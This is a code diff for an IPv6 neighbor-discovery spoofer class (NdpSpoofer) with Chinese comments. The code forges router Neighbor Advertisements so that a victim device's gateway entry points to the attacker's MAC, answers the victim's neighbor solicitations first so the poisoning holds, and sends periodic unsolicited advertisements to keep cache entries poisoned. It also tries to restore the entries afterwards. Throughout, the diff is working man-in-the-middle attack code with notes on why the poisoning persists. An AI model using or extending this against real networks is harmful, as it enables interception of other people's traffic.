@@ -113,6 +113,7 @@ void NdpSpoofer::stopSpoof(const QString &victimMac)
         return;
     if (configured())
         healOne(it.value());
+    m_victimLL.remove(it.value());
     m_victims.erase(it);
     if (m_victims.isEmpty()) {
         if (m_timer->isActive())
@@ -130,6 +131,7 @@ void NdpSpoofer::healAll()
             healOne(it.value());
     }
     m_victims.clear();
+    m_victimLL.clear();
     if (m_timer && m_timer->isActive())
         m_timer->stop();
     if (m_boostTimer && m_boostTimer->isActive())
@@ -166,6 +168,9 @@ bool NdpSpoofer::answerNeighborSolicit(const QByteArray &frame)
         }
     if (allZero)
         return false;
+
+    // 记住 victim 的链路本地源地址：heal 时要向它**单播** solicited NA 才能覆盖 REACHABLE 表项。
+    m_victimLL.insert(senderMac, senderIp);
 
     // 回一帧 solicited NA：dst = 发起者，src = 路由器 LL，target = 路由器 LL，TLLA = 本机 MAC，
     // R+S+O 全置 → 设备把「路由器在本机 MAC」采信为最新。
@@ -251,9 +256,12 @@ void NdpSpoofer::sendSpoof(const QByteArray &victimMac6)
 {
     if (!m_endpoint || !configured())
         return;
-    // 非请求 NA：L3 目的 = ff02::1（all-nodes，设备是成员必处理），L2 目的 = victim 单播 MAC
-    //（只此设备收得到，不污染全网）。target = 路由器 LL、TLLA = 本机 MAC、R+O 置位（Override 让它
-    // 覆盖已有的正确缓存）。src = 路由器 LL（冒充路由器自己发的）。
+    // 周期投毒 NA：L3 目的 = ff02::1（all-nodes 组播，设备是成员必处理），L2 目的 = victim 单播 MAC
+    //（只此设备收得到，不污染全网）。target = 路由器 LL、TLLA = 本机 MAC、R+O。src = 路由器 LL。
+    // ★ 这里**只用非请求(S=0)**：solicited NA 必须单播（组播 solicited 是非法帧、会被丢），所以周期
+    //   组播 NA 不能带 S。它的作用是「维持」——把设备**非 REACHABLE**（STALE 等）的表项持续压在本机
+    //   MAC 上。真正把 REACHABLE 表项翻过来的是抢答 NS 那条**单播 solicited** NA（answerNeighborSolicit）
+    //   和 heal 的单播 NA。这与设备实际会主动 NS 解析网关（首用/老化后）相吻合。
     const QByteArray na = buildNa(victimMac6, m_localMac, m_routerLL, allNodes(), m_routerLL,
                                   m_localMac, kNaRouter | kNaOverride);
     m_endpoint->send(na);
@@ -263,9 +271,22 @@ void NdpSpoofer::healOne(const QByteArray &victimMac6)
 {
     if (!m_endpoint)
         return;
-    // 还原：target = 路由器 LL、TLLA = **真实路由器 MAC**、R+O 置位 → 把设备缓存改回真路由器。
-    const QByteArray na = buildNa(victimMac6, m_routerMac, m_routerLL, allNodes(), m_routerLL,
-                                  m_routerMac, kNaRouter | kNaOverride);
+    // 把设备的网关表项从「本机 MAC」还原回「真实路由器 MAC」——**尽力而为**的一帧。
+    // ★ 诚实说明 NDP 的固有限制（实测于 Linux victim）：设备**只认「对自己主动发出的 NS 的应答」**
+    //   那条 NA（这正是投毒能落地的原因——coast 抢答设备的 NS）。对设备**没主动问**却发来的 NA，无论
+    //   unsolicited/solicited、override、单播/组播、eth-src 用谁，Linux 一律**不改**其网关邻居表项
+    //   （这也反过来让投毒一旦坐实就很稳——真路由器的非请求 NA 同样撼不动它）。所以「主动 heal」在
+    //   Linux 上无法强制生效。真正可靠的还原是：**coast 一停止投毒（disableAll 停表），真实网络的
+    //   路由器会用它周期的 RA + 设备表项老化后的重新解析把设备收回**（与所有 ARP/NDP 中间人释放目标
+    //   的方式一致）。本帧对**非 Linux 设备（Win/mac/iOS，通常不那么严格）**与 **STALE 表项**仍能即时
+    //   生效，故保留：单播 solicited+override 到设备链路本地地址（eth-src 用本机真实 MAC、TLLA=真路由器
+    //   MAC），未记到设备 LL 时退回组播 override。
+    const QByteArray ll = m_victimLL.value(victimMac6);
+    const QByteArray na = (ll.size() == 16)
+            ? buildNa(victimMac6, m_localMac, m_routerLL, ll, m_routerLL, m_routerMac,
+                      kNaRouter | kNaSolicited | kNaOverride)
+            : buildNa(victimMac6, m_localMac, m_routerLL, allNodes(), m_routerLL, m_routerMac,
+                      kNaRouter | kNaOverride);
     for (int i = 0; i < kHealRepeat; ++i)
         m_endpoint->send(na);
 }
